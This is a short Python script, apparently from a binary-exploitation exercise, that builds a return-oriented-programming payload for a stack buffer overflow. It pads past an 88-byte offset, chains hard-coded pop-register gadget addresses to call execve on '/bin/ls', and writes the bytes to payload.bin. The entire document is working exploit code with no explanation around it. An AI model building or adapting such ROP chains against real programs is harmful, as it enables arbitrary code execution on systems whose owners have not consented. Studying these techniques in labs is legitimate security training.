buf_addr = 0x7fffffffe610
bin_ls = 0x2f62696e2f6c7300
zero = 0
addr_of_buf_addr = buf_addr + 8
rdi_g = 0x7ffff7e8ba17
rsi_g = 0x7ffff7e8a9dc
rdx_g = 0x7ffff7e8bb8d 
execve_addr = 0x7ffff7e8c080
offset_b2r = 88


payload = bin_ls.to_bytes(8, "big") + buf_addr.to_bytes(8, "little") + zero.to_bytes(offset_b2r-16, "little") + rdi_g.to_bytes(8, "little") + buf_addr.to_bytes(8, "little") + rsi_g.to_bytes(8, "little") + addr_of_buf_addr.to_bytes(8, "little") + rdx_g.to_bytes(8, "little") + zero.to_bytes(8, "little") + execve_addr.to_bytes(8, "little")

fw = open('payload.bin', 'wb')
fw.write(payload)
fw.close()
